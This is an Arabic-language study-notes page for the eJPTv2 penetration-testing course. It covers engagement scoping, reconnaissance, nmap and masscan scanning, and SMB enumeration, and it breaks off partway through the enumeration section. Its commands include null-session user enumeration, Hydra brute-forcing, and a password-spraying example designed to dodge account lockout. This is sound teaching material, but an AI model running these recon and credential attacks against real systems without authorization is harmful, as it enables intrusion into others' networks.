---
title: "eJPTv2 Study Notes"
published: 2026-09-07
description: "نوتس عملية وشاملة تغطي كل مراحل اختبار الاختراق وفق منهج eJPTv2"
tags: ["eJPTv2", "Penetration Testing", "Network Security", "Web Security", "Enumeration"]
category: "Courses Notes"
draft: false
---

<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;500;600;700;800&family=IBM+Plex+Mono:wght@400;500&display=swap" rel="stylesheet">
<style>
.ejpt-rtl-notes{
    --bg: #0f1216;
    --panel: #161b22;
    --panel-2: #1c222b;
    --border: #2a323d;
    --text: #e6e9ee;
    --text-dim: #a6adb8;
    --accent: #4fd1c5;
    --accent-2: #f4b740;
    --danger: #ef6a6a;
    --code-bg: #0d1117;
    --radius: 12px;
  }
.ejpt-rtl-notes *{ box-sizing: border-box; }
.ejpt-rtl-notes{
    margin:0; padding:0;
    background: var(--bg);
    color: var(--text);
    font-family: 'Cairo', 'Segoe UI', Tahoma, sans-serif;
    direction: rtl;
    text-align: right;
    line-height: 1.9;
    font-size: 17px;
  }
.ejpt-rtl-notes .wrap{
    max-width: 980px;
    margin: 0 auto;
    padding: 40px 24px 100px;
  }
.ejpt-rtl-notes header.hero{
    background: linear-gradient(135deg, #16222b 0%, #10151b 100%);
    border: 1px solid var(--border);
    border-radius: var(--radius);
    padding: 40px 32px;
    margin-bottom: 36px;
    position: relative;
    overflow: hidden;
  }
.ejpt-rtl-notes header.hero::before{
    content:"";
    position:absolute;
    inset: -40% -10% auto auto;
    width: 320px; height: 320px;
    background: radial-gradient(circle, rgba(79,209,197,0.18), transparent 70%);
    pointer-events: none;
  }
.ejpt-rtl-notes .eyebrow{
    display:inline-block;
    font-family: 'IBM Plex Mono', monospace;
    font-size: 13px;
    letter-spacing: 0.5px;
    color: var(--accent);
    background: rgba(79,209,197,0.08);
    border: 1px solid rgba(79,209,197,0.35);
    padding: 5px 12px;
    border-radius: 999px;
    margin-bottom: 18px;
  }
.ejpt-rtl-notes h1.title{
    font-size: 32px;
    font-weight: 800;
    margin: 0 0 12px;
    line-height: 1.5;
  }
.ejpt-rtl-notes .subtitle{
    color: var(--text-dim);
    font-size: 16.5px;
    max-width: 700px;
    margin: 0;
  }
.ejpt-rtl-notes nav.toc{
    background: var(--panel);
    border: 1px solid var(--border);
    border-radius: var(--radius);
    padding: 24px 28px;
    margin-bottom: 40px;
  }
.ejpt-rtl-notes nav.toc h2{
    margin: 0 0 16px;
    font-size: 18px;
    color: var(--accent-2);
  }
.ejpt-rtl-notes nav.toc ol{
    margin: 0; padding-inline-start: 22px;
    columns: 2;
    gap: 28px;
  }
.ejpt-rtl-notes nav.toc li{ margin-bottom: 10px; break-inside: avoid; }
.ejpt-rtl-notes nav.toc a{
    color: var(--text);
    text-decoration: none;
    border-bottom: 1px dashed transparent;
    transition: border-color .15s, color .15s;
  }
.ejpt-rtl-notes nav.toc a:hover{ color: var(--accent); border-color: var(--accent); }
@media (max-width: 640px){
.ejpt-rtl-notes nav.toc ol{ columns: 1; }
}
.ejpt-rtl-notes section.stage{
    margin-bottom: 52px;
  }
.ejpt-rtl-notes section.stage > h2{
    display:flex;
    align-items:center;
    gap: 14px;
    font-size: 24px;
    font-weight: 800;
    color: var(--text);
    border-bottom: 2px solid var(--border);
    padding-bottom: 14px;
    margin: 0 0 22px;
  }
.ejpt-rtl-notes section.stage > h2 .num{
    flex: 0 0 auto;
    width: 38px; height: 38px;
    display:flex; align-items:center; justify-content:center;
    background: var(--accent);
    color: #0b1014;
    border-radius: 10px;
    font-family: 'IBM Plex Mono', monospace;
    font-weight: 700;
    font-size: 16px;
  }
.ejpt-rtl-notes h3{
    font-size: 19px;
    font-weight: 700;
    color: var(--accent-2);
    margin: 30px 0 12px;
  }
.ejpt-rtl-notes h4{
    font-size: 16.5px;
    font-weight: 700;
    color: var(--text);
    margin: 22px 0 8px;
  }
.ejpt-rtl-notes p{ margin: 0 0 16px; color: var(--text); }
.ejpt-rtl-notes .dim{ color: var(--text-dim); }
.ejpt-rtl-notes ul, .ejpt-rtl-notes ol.plain{
    margin: 0 0 16px;
    padding-inline-start: 26px;
  }
.ejpt-rtl-notes li{ margin-bottom: 8px; }
.ejpt-rtl-notes strong{ color: var(--accent-2); font-weight: 700; }
.ejpt-rtl-notes .pipeline{
    display:flex;
    flex-wrap: wrap;
    gap: 10px;
    align-items:center;
    background: var(--panel);
    border: 1px solid var(--border);
    border-radius: var(--radius);
    padding: 20px;
    margin: 18px 0 24px;
    font-family: 'IBM Plex Mono', monospace;
    font-size: 14.5px;
  }
.ejpt-rtl-notes .pipeline .step{
    background: var(--panel-2);
    border: 1px solid var(--border);
    color: var(--accent);
    padding: 8px 14px;
    border-radius: 8px;
    white-space: nowrap;
  }
.ejpt-rtl-notes .pipeline .arrow{ color: var(--text-dim); }
.ejpt-rtl-notes .callout{
    border-radius: 10px;
    padding: 16px 20px;
    margin: 18px 0;
    border-right: 4px solid var(--accent);
    background: rgba(79,209,197,0.06);
  }
.ejpt-rtl-notes .callout.example{
    border-right-color: var(--accent-2);
    background: rgba(244,183,64,0.07);
  }
.ejpt-rtl-notes .callout.warning{
    border-right-color: var(--danger);
    background: rgba(239,106,106,0.08);
  }
.ejpt-rtl-notes .callout .label{
    display:block;
    font-family: 'IBM Plex Mono', monospace;
    font-size: 12.5px;
    letter-spacing: 0.4px;
    font-weight: 700;
    margin-bottom: 8px;
  }
.ejpt-rtl-notes .callout.example .label{ color: var(--accent-2); }
.ejpt-rtl-notes .callout.warning .label{ color: var(--danger); }
.ejpt-rtl-notes .callout:not(.example):not(.warning) .label{ color: var(--accent); }
.ejpt-rtl-notes .callout p:last-child{ margin-bottom: 0; }
.ejpt-rtl-notes pre{
    background: var(--code-bg);
    border: 1px solid var(--border);
    border-radius: 10px;
    padding: 16px 18px;
    overflow-x: auto;
    margin: 14px 0 20px;
    direction: ltr;
    text-align: left;
  }
.ejpt-rtl-notes code{
    font-family: 'IBM Plex Mono', monospace;
    font-size: 14px;
    color: #c8f0e8;
    line-height: 1.7;
  }
.ejpt-rtl-notes p code, .ejpt-rtl-notes li code{
    background: rgba(79,209,197,0.1);
    color: var(--accent);
    padding: 2px 7px;
    border-radius: 5px;
    font-size: 14px;
    direction: ltr;
    display: inline-block;
  }
.ejpt-rtl-notes .table-wrap{
    overflow-x: auto;
    margin: 16px 0 24px;
    border: 1px solid var(--border);
    border-radius: 10px;
  }
.ejpt-rtl-notes table{
    width: 100%;
    border-collapse: collapse;
    font-size: 15px;
    background: var(--panel);
  }
.ejpt-rtl-notes thead th{
    background: var(--panel-2);
    color: var(--accent-2);
    text-align: right;
    padding: 12px 16px;
    font-weight: 700;
    border-bottom: 2px solid var(--border);
    white-space: nowrap;
  }
.ejpt-rtl-notes tbody td{
    padding: 12px 16px;
    border-bottom: 1px solid var(--border);
    vertical-align: top;
  }
.ejpt-rtl-notes tbody tr:last-child td{ border-bottom: none; }
.ejpt-rtl-notes tbody tr:hover{ background: rgba(255,255,255,0.02); }
.ejpt-rtl-notes td code{ direction: ltr; display:inline-block; }
.ejpt-rtl-notes hr.section-divider{
    border: none;
    border-top: 1px solid var(--border);
    margin: 44px 0;
  }
.ejpt-rtl-notes footer{
    text-align:center;
    color: var(--text-dim);
    font-size: 14px;
    margin-top: 60px;
    padding-top: 24px;
    border-top: 1px solid var(--border);
  }
.ejpt-rtl-notes a.back-to-top{
    display:inline-block;
    margin-top: 10px;
    font-size: 13px;
    color: var(--accent);
    text-decoration:none;
  }
</style>
<div class="ejpt-rtl-notes">
<div class="wrap">
  <header class="hero" id="top">
    <span class="eyebrow">PENTESTING NOTES · eJPTv2</span>
    <h1 class="title">نوتس eJPTv2 — ملخص شامل لكل مراحل اختبار الاختراق</h1>
    <p class="subtitle">
      دليل مرجعي سريع لكل مراحل اختبار الاختراق كما وردت في كورس eJPTv2، من التخطيط والاتفاق مع العميل
      وحتى استغلال تطبيقات الويب، مع شرح للمفاهيم، الأدوات، أوامر التثبيت والاستخدام، وأمثلة عملية لكل مرحلة.
    </p>
  </header>
  <nav class="toc">
    <h2>محتويات النوتس</h2>
    <ol>
      <li><a href="#process">عملية اختبار الاختراق (Penetration Testing Process)</a></li>
      <li><a href="#info-gathering">أنواع جمع المعلومات (Information Gathering)</a></li>
      <li><a href="#footprinting">التتبع والفحص (Footprinting and Scanning)</a></li>
      <li><a href="#enumeration">الاستخراج (Enumeration)</a></li>
      <li><a href="#vuln-assessment">تقييم الثغرات (Vulnerability Assessment)</a></li>
      <li><a href="#network-auditing">تدقيق الشبكات (Network Auditing)</a></li>
      <li><a href="#network-pentest">اختبار اختراق الشبكات (Network Penetration Testing)</a></li>
      <li><a href="#webapp-pentest">اختبار اختراق تطبيقات الويب (Web Application Penetration Testing)</a></li>
      <li><a href="#tools-install">تثبيت الأدوات الأساسية للكورس</a></li>
    </ol>
  </nav>
  <!-- ============ 1. PROCESS ============ -->
  <section class="stage" id="process">
    <h2><span class="num">1</span> عملية اختبار الاختراق (Penetration Testing Process)</h2>
    <p>دي المراحل اللي بتمر بيها عملية اختبار الاختراق بالترتيب:</p>
    <div class="pipeline">
      <span class="step">Engagement</span><span class="arrow">→</span>
      <span class="step">Information Gathering</span><span class="arrow">→</span>
      <span class="step">Scanning</span><span class="arrow">→</span>
      <span class="step">Enumeration</span><span class="arrow">→</span>
      <span class="step">Exploitation</span><span class="arrow">→</span>
      <span class="step">Post-Exploitation</span><span class="arrow">→</span>
      <span class="step">Reporting</span>
    </div>
    <p>
      الفكرة الأساسية إن اختبار الاختراق مش "افتح Metasploit وابدأ تضرب Exploits عشوائي" — دي عملية منظمة، كل مرحلة
      فيها بتبني على اللي قبلها، ولو قفزت مرحلة أو استعجلت فيها، هتلاقي نفسك تايه في مرحلة الاستغلال من غير ما تعرف
      إنت بتخترق إيه بالظبط.
    </p>
    <h3>Engagement</h3>
    <p>
      دي المرحلة اللي بيتم فيها الاتفاق بين البينتستر والكلاينت (مالك المؤسسة). بيتحدد فيها:
    </p>
    <ul>
      <li><strong>الـ Scope:</strong> إيه الأنظمة المسموح تختبرها بالظبط (IP Ranges، دومينات، تطبيقات)، وإيه اللي ممنوع تلمسه خالص</li>
      <li><strong>نوع الاختبار:</strong> Black Box (من غير أي معلومات مسبقة)، White Box (بمعلومات كاملة عن البنية التحتية)، أو Grey Box (معلومات جزئية)</li>
      <li>السعر وعدد الأيام وعدد الساعات يوميًا المتاحة للاختبار</li>
      <li><strong>نقطة التواصل (Point of Contact):</strong> مين اللي البينتستر هيتواصل معاه لو حصل حادث غير متوقع، زي إنه سبب تعطل لخدمة حقيقية بالغلط</li>
      <li><strong>الـ Rules of Engagement (RoE):</strong> وثيقة رسمية بتوضح الصلاحيات القانونية للاختبار، وده اللي بيحميك لو حصل أي مشكلة</li>
    </ul>
    <div class="callout example">
      <span class="label">مثال عملي</span>
      <p>
        لو الكلاينت قالك "اختبر الشبكة الداخلية بتاعتنا"، وانت لقيت أثناء الفحص سيرفر خارج نطاق الـ IP Range المتفق
        عليه، الأصل إنك توقف وترجع تتأكد من الكلاينت قبل ما تكمل، حتى لو السيرفر ده شكله ضعيف وسهل الاختراق.
        الخروج عن الـ Scope من غير إذن بيحول اختبار الاختراق القانوني لجريمة إلكترونية.
      </p>
    </div>
    <h3>Information Gathering</h3>
    <p>دي مرحلة جمع المعلومات، وبتتقسم لنوعين رئيسيين:</p>
    <h4>Passive Information Gathering</h4>
    <p>
      البينتستر بيجمع معلومات عن الهدف من غير أي تفاعل مباشر معاه، يعني الهدف نفسه أو أي جهاز تابع له ملهوش أي أثر
      إنك بتراقبه. المعلومات دي بتشمل:
    </p>
    <ul>
      <li>تحديد عناوين IP ومعلومات DNS</li>
      <li>تحديد أسماء النطاقات وملكيتها</li>
      <li>تحديد عناوين البريد الإلكتروني وملفات التعريف على وسائل التواصل الاجتماعي</li>
      <li>تحديد التقنيات المستخدمة في المواقع المستهدفة</li>
      <li>تحديد النطاقات الفرعية</li>
    </ul>
    <h4>Active Information Gathering</h4>
    <p>
      هنا بيحصل تفاعل مباشر مع الهدف (طلبات HTTP فعلية، اتصالات على منافذ، إلخ)، وده معناه إن فيه احتمال إن أنظمة
      الحماية زي الـ IDS/IPS تلاحظ نشاطك. المعلومات اللي بتجمعها هنا:
    </p>
    <ul>
      <li>اكتشاف المنافذ المفتوحة على الأنظمة المستهدفة</li>
      <li>التعرف على البنية التحتية الداخلية لشبكة الهدف</li>
      <li>استخراج المعلومات من الأنظمة المستهدفة مباشرة (زي banner grabbing)</li>
    </ul>
    <p class="dim">
      الفرق العملي بينهم إن الـ Passive بتاخد وقت أطول وبتديك صورة عامة، والـ Active بتديك تفاصيل دقيقة لكنها
      بتزود فرصة اكتشافك.
    </p>
    <h4>تقنيات وأدوات جمع المعلومات</h4>
    <div class="table-wrap">
      <table>
        <thead>
          <tr><th>التقنية</th><th>الاستخدام</th></tr>
        </thead>
        <tbody>
          <tr><td>Whois Enumeration</td><td>لجمع معلومات النطاق</td></tr>
          <tr><td>DNS Recon</td><td>لاستكشاف وتحليل معلومات DNS</td></tr>
          <tr><td>WAF Detection (wafw00f)</td><td>للكشف عن جدران الحماية</td></tr>
          <tr><td>Subdomain Enumeration (Sublist3r / Amass)</td><td>لتحديد النطاقات الفرعية</td></tr>
          <tr><td>Google Dorks</td><td>لاستخدام محركات البحث بفعالية في جمع المعلومات</td></tr>
          <tr><td>Email Harvesting (theHarvester)</td><td>لجمع عناوين البريد الإلكتروني</td></tr>
          <tr><td>Leaked Password Databases</td><td>للبحث في قواعد بيانات كلمات المرور المسربة</td></tr>
          <tr><td>DNS Zone Transfers</td><td>لاستكشاف نقل مناطق DNS</td></tr>
          <tr><td>سجلات DNS</td><td>A, AAAA, NS, MX, CNAME, TXT وغيرها</td></tr>
          <tr><td>DNS Interrogation</td><td>تحليل سجلات DNS لاستخراج IPs والنطاقات الفرعية</td></tr>
          <tr><td>Host Discovery (Nmap)</td><td>لاكتشاف الأجهزة الموجودة على الشبكة</td></tr>
          <tr><td>Port Scanning (Nmap)</td><td>لفحص المنافذ المفتوحة</td></tr>
          <tr><td>Shodan</td><td>محرك بحث للأجهزة المتصلة بالإنترنت مباشرة (كاميرات، راوترات، سيرفرات)</td></tr>
          <tr><td>Maltego</td><td>ربط المعلومات المجمّعة ببعض بصريًا (أشخاص، دومينات، إيميلات) في خريطة واحدة</td></tr>
        </tbody>
      </table>
    </div>
    <div class="callout">
      <span class="label">ملاحظة</span>
      <p>
        لو الـ DNS Zone Transfer مكوّن بشكل غير صحيح، ممكن يتم استغلاله للحصول على نظرة شاملة على شبكة المؤسسة
        بالكامل — بما فيها أسماء السيرفرات الداخلية وعناوينها، وده بيوفر عليك مجهود اكتشاف كبير.
      </p>
    </div>
    <h4>تثبيت واستخدام الأدوات</h4>
    <p><strong>Whois</strong></p>
    <pre><code>sudo apt-get update
sudo apt-get install whois</code></pre>
    <pre><code>whois example.com
whois 8.8.8.8</code></pre>
    <p>بتطلعلك معلومات زي: مين مسجل الدومين، تاريخ التسجيل والانتهاء، وسيرفرات الـ DNS المرتبطة بيه. مفيدة كخطوة أولى قبل أي حاجة تانية.</p>
    <p><strong>wafw00f</strong></p>
    <pre><code>python3 --version
pip3 install wafw00f</code></pre>
    <pre><code>wafw00f http://example.com</code></pre>
    <p>
      بتساعدك تعرف لو فيه جدار حماية (WAF) بيحمي التطبيق، ونوعه (Cloudflare، Akamai، ModSecurity...)، وده بيأثر على
      طريقة تعاملك مع التطبيق بعد كده — مثلًا لو فيه WAF، هجمات SQL Injection المباشرة هتتحظر، فهتحتاج تفكر في
      تقنيات Evasion.
    </p>
    <p><strong>Sublist3r</strong></p>
    <pre><code>sudo apt-get install git
pip install -r requirements.txt</code></pre>
    <pre><code>python sublist3r.py -d example.com</code></pre>
    <p>
      بتجمع النطاقات الفرعية من مصادر متعددة (Google، Bing، Yahoo، VirusTotal...) في أمر واحد. لو لقيت subdomain
      زي <code>dev.example.com</code> أو <code>staging.example.com</code>، غالبًا دي بتبقى بيئات أقل تأمينًا من الموقع الرئيسي.
    </p>
    <p><strong>theHarvester</strong></p>
    <pre><code>sudo apt-get install git
git clone https://github.com/laramies/theHarvester.git
pip install -r requirements.txt</code></pre>
    <pre><code>python3 theHarvester.py -d example.com -b all</code></pre>
    <p>
      الإيميلات اللي بتجمعها هنا مش بس لغرض التوعية، دي بتفيدك بعد كده في هجمات زي Password Spraying على بوابات
      تسجيل الدخول (VPN، Webmail، Office365).
    </p>
    <p><strong>Nmap</strong></p>
    <pre><code>sudo apt-get update
sudo apt-get install nmap</code></pre>
    <pre><code>nmap -p 80 example.com</code></pre>
    <div class="callout example">
      <span class="label">مثال عملي متكامل</span>
      <p>
        تخيل عندك دومين <code>target.com</code>. أول خطوة <code>whois target.com</code> تعرف بيه مين صاحب الدومين
        وأسماء الـ Name Servers. بعدها <code>sublist3r -d target.com</code> تكتشف إن فيه <code>mail.target.com</code>
        و<code>vpn.target.com</code>. تجيب إيميلات الموظفين بـ theHarvester، وتشوف لو فيه WAF قدام الموقع الرئيسي
        بـ wafw00f. في الآخر، عندك صورة كاملة عن الهدف من غير ما تبعت أي طلب فحص شرس واحد لسه.
      </p>
    </div>
    <p class="dim">كدا خلصنا جزء الـ Information Gathering بالكامل.</p>
  </section>
  <hr class="section-divider">
  <!-- ============ 2. FOOTPRINTING ============ -->
  <section class="stage" id="footprinting">
    <h2><span class="num">2</span> التتبع والفحص (Footprinting and Scanning)</h2>
    <p>
      السكشن ده لا يقل أهمية عن اللي قبله، لأن عملية الاستطلاع وجمع المعلومات بتشكل نسبة كبيرة من نجاح عملية اختبار
      الاختراق بالكامل — الإحصائية الشائعة في المجال إن حوالي 60-70% من وقت أي اختبار اختراق حقيقي بيروح في
      الاستطلاع والفحص، مش في الاستغلال نفسه.
    </p>
    <p>الفكرة الأساسية: قبل ما تبدأ تخترق أي حاجة، لازم تجمع كل المعلومات اللي تقدر توصلها عن الهدف بدون ما تخليه يحس إنك بتراقبه.</p>
    <h3>أنواع جمع المعلومات</h3>
    <h4>1. Passive Footprinting</h4>
    <p>
      جمع معلومات عن الهدف من غير أي تفاعل مباشر معاه — زي متابعة أخبار الشركة، الـ LinkedIn بتاع الموظفين، أو
      المستندات المتاحة على الإنترنت.
    </p>
    <ul>
      <li>
        <strong>Google Dorking:</strong> استخدام جوجل بطرق ذكية للوصول لملفات أو صفحات محددة على الموقع المستهدف:
        <pre><code>site:target.com filetype:pdf
site:target.com inurl:admin
site:target.com intitle:"index of"</code></pre>
      </li>
      <li><strong>TheHarvester:</strong> لجمع الإيميلات، الدومينات، وعناوين IP الخاصة بالشركة</li>
      <li><strong>Recon-ng:</strong> أداة بتجمع المعلومات بشكل منظم وتلقائي، وبتشتغل بنظام Modules زي Metasploit بالظبط</li>
    </ul>
    <h4>2. Active Footprinting</h4>
    <p>هنا بيبدأ التفاعل المباشر مع الهدف — زي فحص الأجهزة أو الخدمات الشغالة عنده.</p>
    <ul>
      <li><strong>Nmap:</strong> بيفحص المنافذ والخدمات الشغالة على الجهاز</li>
      <li><strong>Netcraft:</strong> بيدي معلومات عن الموقع والسيرفر، وحتى تاريخ التغييرات اللي حصلت في التقنيات المستخدمة بمرور الوقت</li>
      <li><strong>Shodan:</strong> زي محرك بحث بس مخصص للأجهزة المتصلة بالإنترنت — ممكن تدور فيه بـ <code>org:"Target Company"</code> وتلاقي كل الأجهزة المعرّفة باسم الشركة</li>
    </ul>
    <h3>المعلومات اللي لازم تجمعها</h3>
    <ul>
      <li><strong>معلومات الدومين:</strong> بيانات DNS، معلومات التسجيل، والـ Subdomains</li>
      <li><strong>معلومات الشركة:</strong> عناوين IP، مواقع المكاتب، والموظفين</li>
      <li><strong>معلومات الموقع:</strong> التكنولوجيات المستخدمة، السيرفرات، والحماية</li>
    </ul>
    <h3>الفحص (Scanning)</h3>
    <p>
      بعد جمع المعلومات، بييجي دور الفحص عشان تعرف إيه الشغال على النظام من خدمات — وده بيبقى الأساس اللي هتبني عليه
      أي محاولة اختراق بعد كده. الفكرة ببساطة: من غير Scanning إنت عمال تحاول تخترق حاجة إنت أصلًا مش عارف هي شغالة
      ولا لأ.
    </p>
    <h4>1. فحص المنافذ (Port Scanning)</h4>
    <p>الأداة الأساسية هنا هي Nmap — بتفحص المنافذ، تعرف نظام التشغيل، والخدمات الشغالة.</p>
    <pre><code>nmap -sS -p- [TARGET_IP]       # فحص كل المنافذ
nmap -sV -p 80,443 [TARGET_IP]  # عرض تفاصيل الخدمات
nmap -O [TARGET_IP]             # اكتشاف نظام التشغيل</code></pre>
    <p>فحص سريع وفحص شامل:</p>
    <pre><code>nmap -T4 -F 192.168.1.1        # فحص سريع للمنافذ المفتوحة
nmap -sS -p- 192.168.1.1       # فحص كل المنافذ من 1 لـ 65535</code></pre>
    <p>فرق بسيط بين أنواع الفحص المهمة:</p>
    <div class="table-wrap">
      <table>
        <thead><tr><th>النوع</th><th>الأمر</th><th>ملاحظات</th></tr></thead>
        <tbody>
          <tr><td>TCP SYN Scan</td><td><code>nmap -sS</code></td><td>أسرع نوع وأكتر Stealthy، بيحتاج صلاحيات root</td></tr>
          <tr><td>TCP Connect Scan</td><td><code>nmap -sT</code></td><td>بيكمل الـ Handshake بالكامل، أبطأ وأسهل اكتشافه</td></tr>
          <tr><td>UDP Scan</td><td><code>nmap -sU</code></td><td>أبطأ بكتير، لكن مهم جدًا لخدمات زي SNMP وDNS</td></tr>
          <tr><td>Aggressive Scan</td><td><code>nmap -A</code></td><td>بيجمع OS Detection + Version Detection + Scripts + Traceroute في أمر واحد</td></tr>
        </tbody>
      </table>
    </div>
    <div class="callout example">
      <span class="label">مثال عملي</span>
      <p>
        لو عملت <code>nmap -sV [TARGET_IP]</code> ولقيت المنفذ 445 مفتوح وعليه Microsoft-DS، ده معناه غالبًا الجهاز
        ده Windows وشغال عليه SMB — يبقى خطوتك التالية منطقيًا تكون Enumeration للـ SMB، مش مثلاً تحاول Exploit خاص
        بـ Apache.
      </p>
    </div>
    <p>
      <strong>Masscan</strong> — بيعمل نفس شغل Nmap بس أسرع بكتير، ومناسب لفحص ملايين المنافذ في ثواني، خصوصًا لو
      بتفحص شبكة كبيرة أو نطاق IP واسع:
    </p>
    <pre><code>masscan -p1-65535 192.168.1.0/24 --rate=1000</code></pre>
    <p><strong>Unicornscan</strong> — أداة قوية لفحص الشبكات الكبيرة وعندها قدرات مميزة في التعامل مع بروتوكولات مختلفة:</p>
    <pre><code>unicornscan -i eth0 -mT -p 1-65535 192.168.1.1</code></pre>
    <h4>2. فحص الثغرات (Vulnerability Scanning)</h4>
    <p>بعد ما نعرف المنافذ والخدمات، بنشوف لو فيها ثغرات معروفة.</p>
    <ul>
      <li><strong>Nessus:</strong> أداة شاملة بتفحص وتطلع تقرير كامل بالثغرات مصنفة من Critical لحد Low</li>
      <li><strong>OpenVAS:</strong> نسخة مفتوحة المصدر بتعمل نفس الشغل تقريبًا</li>
      <li><strong>Nikto:</strong> بتفحص السيرفرات وتكشف الثغرات أو الإعدادات الخاطئة
        <pre><code>nikto -h http://example.com</code></pre>
      </li>
    </ul>
    <h4>3. فحص الشبكة (Network Scanning)</h4>
    <p>الهدف هنا معرفة مين متصل على الشبكة والشبكات الفرعية.</p>
    <p><strong>Netdiscover:</strong></p>
    <pre><code>netdiscover -r 192.168.1.0/24</code></pre>
    <p><strong>Fping</strong> — بيعمل Ping على مجموعة عناوين IP بسرعة:</p>
    <pre><code>fping -a -g 192.168.1.0/24</code></pre>
    <p><strong>Angry IP Scanner</strong> — أداة بواجهة رسومية سهلة لفحص عناوين الـ IP.</p>
    <h3>أدوات إضافية مفيدة</h3>
    <ul>
      <li><strong>Wireshark:</strong> لمراقبة الشبكة وفهم اللي بيحصل فيها لحظة بلحظة</li>
      <li><strong>Dirbuster / Dirb:</strong> لاكتشاف الملفات والدلائل المخفية على السيرفر</li>
      <li>
        <strong>Gobuster:</strong> بديل أسرع وأخف من Dirbuster، مكتوب بلغة Go، ومفيد للـ Directory Brute-forcing
        والـ DNS Subdomain discovery في أداة واحدة:
        <pre><code>gobuster dir -u http://example.com -w /usr/share/wordlists/dirb/common.txt</code></pre>
      </li>
      <li><strong>Fierce:</strong> لفحص معلومات DNS بشكل متقدم</li>
      <li><strong>Dnsenum:</strong> للبحث في معلومات DNS بتفصيل أكبر</li>
      <li>
        <strong>Netcat:</strong> أداة كلاسيكية لـ Banner Grabbing يدويًا والتأكد من الخدمة الشغالة فعليًا على منفذ معين:
        <pre><code>nc -nv [TARGET_IP] 22</code></pre>
      </li>
    </ul>
    <h3>نصائح للفحص</h3>
    <ul>
      <li>اتأكد من الأذونات — قبل أي فحص، لازم يكون عندك إذن رسمي من صاحب الشبكة أو الموقع</li>
      <li>حلل كويس — النتائج ممكن تكون كتير، خد وقتك في التحليل وما تستعجلش</li>
      <li>جرب أكتر من أداة — كل أداة ليها طريقة فحص مختلفة، فممكن تطلعلك معلومات مختلفة</li>
      <li>وثّق كل حاجة أول بأول — بدل ما تعتمد على ذاكرتك، احفظ نتيجة كل سكان في ملف باستخدام <code>-oN</code> أو <code>-oA</code> في Nmap، هتحتاجها وقت كتابة التقرير</li>
    </ul>
  </section>
  <hr class="section-divider">
  <!-- ============ 3. ENUMERATION ============ -->
  <section class="stage" id="enumeration">
    <h2><span class="num">3</span> الاستخراج (Enumeration)</h2>
    <p>
      الـ Enumeration بتيجي بعد مرحلة الـ Scanning، وفيها بنطلع معلومات أكتر تفصيلًا عن النظام أو الشبكة اللي
      بنستهدفها — مين شغال في الشركة، إيه الخدمات الشغالة، إيه الأجهزة المتصلة بالشبكة، وتفاصيل كتير تانية.
    </p>
    <div class="callout">
      <span class="label">الفرق الجوهري</span>
      <p>
        الـ Scanning بيقولك "المنفذ 445 مفتوح"، بينما الـ Enumeration بيقولك "المنفذ 445 مفتوح، والشير اسمه Finance،
        وفيه صلاحية كتابة، والمستخدمين اللي عندهم صلاحية عليه هما دول". يعني الـ Enumeration هي المرحلة اللي بتحول
        معلومة عامة لمعلومة قابلة للاستغلال فعليًا.
      </p>
    </div>
    <h3>أنواع الـ Enumeration</h3>
    <ul>
      <li><strong>Network Enumeration:</strong> معرفة الأجهزة الموجودة في الشبكة وكل جهاز شغال عليه إيه</li>
      <li><strong>User Enumeration:</strong> استخراج المستخدمين الشغالين على السيرفر أو الشبكة</li>
      <li><strong>Service Enumeration:</strong> معرفة الخدمات الشغالة على كل جهاز (FTP، HTTP، SMB... إلخ)</li>
      <li><strong>Protocol Enumeration:</strong> استخراج معلومات عن البروتوكولات المستخدمة في الشبكة (SNMP، NetBIOS، LDAP...)</li>
    </ul>
    <h4>1. Network Enumeration</h4>
    <p><strong>Nmap</strong> — لعمل مسح شامل على الشبكة ومعرفة كل الأجهزة المتصلة:</p>
    <pre><code>nmap -sn 192.168.1.0/24</code></pre>
    <p><strong>Netdiscover:</strong></p>
    <pre><code>netdiscover -r 192.168.1.0/24</code></pre>
    <p><strong>ARP Scan</strong> — لجلب الأجهزة المتصلة باستخدام بروتوكول ARP:</p>
    <pre><code>arp-scan -l</code></pre>
    <h4>2. User Enumeration</h4>
    <p>
      <strong>RPCclient</strong> — لفتح جلسة على جهاز عن طريق SMB واستخراج بيانات المستخدمين. مفيدة جدًا لو الجهاز
      بيسمح بـ Null Session (يعني اتصال من غير Username أو Password):
    </p>
    <pre><code>rpcclient -U "" [TARGET_IP]</code></pre>
    <p>وبعدها جوا الجلسة:</p>
    <pre><code>enumdomusers</code></pre>
    <p>
      <strong>enum4linux</strong> — بيدي تفاصيل شاملة عن أنظمة الويندوز (مستخدمين، جروبات، سياسات كلمات المرور،
      الشيرز، حتى معلومات عن الدومين نفسه) في أمر واحد:
    </p>
    <pre><code>enum4linux -a [TARGET_IP]</code></pre>
    <p><strong>smbclient</strong> — للاتصال المباشر بالشيرز واستعراض محتواها زي ما بتعمل مع FTP تقريبًا:</p>
    <pre><code>smbclient -L //[TARGET_IP] -N
smbclient //[TARGET_IP]/ShareName -N</code></pre>
    <p><strong>Nmap Scripts:</strong></p>
    <pre><code>nmap --script smb-enum-users -p 445 [TARGET_IP]</code></pre>
    <p><strong>Hydra</strong> — لتجربة كلمات مرور مختلفة على قائمة مستخدمين:</p>
    <pre><code>hydra -L users.txt -P passwords.txt [TARGET_IP] smb</code></pre>
    <div class="callout example">
      <span class="label">مثال عملي</span>
      <p>
        لقيت جهاز Windows على المنفذ 445 بيسمح بـ Null Session. عملت <code>enum4linux -a [TARGET_IP]</code> ولقيت
        قائمة مستخدمين فيها <code>j.smith</code>, <code>a.hassan</code>, <code>admin</code>. جمعت الأسماء دي في ملف
        <code>users.txt</code>، وبعدين رحت أعمل Password Spraying بكلمة واحدة شائعة (زي <code>Summer2024!</code>) على
        كل المستخدمين دول بدل ما أحاول Brute-force حساب واحد بقايمة كلمات كبيرة — ده بيقلل فرصة إن الحساب يتقفل
        بسبب سياسة الـ Account Lockout.
      </p>
    </div>
    <h4>3. Service Enumeration</h4>
    <p><strong>Nmap Service Scripts:</strong></p>
    <pre><code>nmap --script ftp-anon,ftp-bounce,ftp-syst -p 21 [TARGET_IP]</code></pre>
    <p><strong>Nikto:</strong></p>
    <pre><code>nikto -h http://example.com</code></pre>
    <p><strong>showmount</strong> — مخصصة لخدمة NFS، بتوريك أي مجلدات متاحة للمشاركة عن بعد:</p>
    <pre><code>showmount -e [TARGET_IP]</code></pre>
    <p><strong>Metasploit Auxiliary Modules:</strong></p>
    <pre><code>use auxiliary/scanner/smb/smb_enumshares
set RHOSTS [TARGET_IP]
run</code></pre>
